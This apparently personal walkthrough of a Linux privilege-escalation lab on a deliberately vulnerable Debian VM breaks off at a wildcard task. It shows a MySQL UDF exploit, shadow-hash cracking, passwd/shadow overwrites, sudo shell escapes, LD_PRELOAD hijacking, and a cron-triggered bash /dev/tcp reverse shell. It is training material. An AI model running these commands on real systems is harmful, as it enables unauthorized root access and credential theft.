@@ -1,0 +1,230 @@
+START: 5/17/2024
+
+TASK1: DEPLOY THE VULNERABLE DEBIAN VM
+1. Deployed the machine: yes
+2. Run the "id" command. What is the result?
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+
+TASK2: SERVICE EXPLOITS
+MySQL is running on root without a password. https://www.exploit-db.com/exploits/1518
+user@debian:~$ cd /home/user/tools/mysql-udf
+user@debian:~/tools/mysql-udf$ ls
+raptor_udf2.c
+user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
+user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+user@debian:~/tools/mysql-udf$ mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 35
+Server version: 5.1.73-1+deb6u1 (Debian)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.01 sec)
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.00 sec)
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
++------------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
++------------------------------------------------------------------+
+|                                                                0 |
++------------------------------------------------------------------+
+1 row in set (0.00 sec)
+mysql> exit
+Bye
+user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
+rootbash-4.1# 
+
+TASK3 - Weak File Permissions - Readable /etc/shadow
+user@debian:~/tools/mysql-udf$ ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+user@debian:~/tools/mysql-udf$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+
+1. what is the root user's password hash?
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0
+
+2. What hashing algorithm was used to produce the root user's password hash?
+sha512crypt
+Using: https://hashes.com/en/tools/hash_identifier
+
+3. What is the root user's password? password123
+copy that hash to a file and use john on it with rock you wordlist
+
+TASK4: Weak File Permissions - Writable /etc/shadow
+-rw-r--rw- 1 root shadow 820 May 17 23:46 /etc/shadow
+user@debian:~/tools/mysql-udf$ mkpasswd -m sha-512 new
+$6$9/KxNxSNGwhW8x5$VUGVyvRdfhyGDqiIGBPKUzaLi620UNHTDBlwzbH5arKCenCOdZkh6YOV56EGq9qR.SXeeT0spFOEZ66mlpRsw/
+Now put that in for root in /etc/shadow and then su into root.
+
+TASK5:Weak File Permissions - Writable /etc/passwd
+user@debian:~$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+user@debian:~$ openssl passwd yup
+g/LQCiseii/BY
+user@debian:~$ nano /etc/passwd
+//now place this in between the first and second colon at root in the /etc/passwd file.
+user@debian:~$ su root
+Password: 
+root@debian:/home/user#
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+
+TASK6: SUDO-SHELL ESCAPE SEQUENCES
+list programs allowing for sudo in user:
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+Using https://gtfobins.github.io/gtfobins/nmap/ you can look at these and escape to a root shell:
+user@debian:~$ sudo nmap --interactive
+
+Starting Nmap V. 5.00 ( http://nmap.org )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+sh-4.1# whoami
+root
+
+TASK7: SUDO-ENVIRONMENT VARIABLES
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+Create a shared object using code located at /home/user/tools/sudo/preload.c
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+
+This will let us run a program we have access to with sudo using LD_PRELOAD
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+
+This gives us a root shell. 
+user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.cuser@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nano
+root@debian:/home/user# 
+
+Now run ldd with apache2
+$ ldd /usr/sbin/apache2
+
+This shows us shared libraries.
+We can make a shared object in one of these libraries:
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+Follow the rest to get root:
+user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
+apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
+root@debian:/home/user#
+I believe this method wouldn't work a second time because you're doing it in the tmp path.
+
+TASK8: CRON JOBS - FILE PERMISSIONS
+user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+user@debian:~$ locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1466.7 days)
+/usr/local/bin/overwrite.sh
+user@debian:~$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+
+This shows that the file is writeable
+In the file replace the text with this to get a reverse shell using netcat:
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+Use your ip for 10.10.10.10
+$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [ip] from (UNKNOWN) [10.10.42.143] 38327
+bash: no job control in this shell
+root@debian:~# 
+
+TASK9: CRON JOBS - PATH ENVIRONMENT VARIABLE
+view the crontab
+This shows us the path as following:
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+This means that we can create an overwrite.sh in this path.
+We write this to the file:
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+Make it an executable:
+user@debian:~$ chmod +x /home/user/overwrite.sh
+
+Now to gain root shell:
+user@debian:~$ /tmp/rootbash -p
+rootbash-4.1#
+
+TASK10: CRON JOBS - WILDCARDS
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+
+
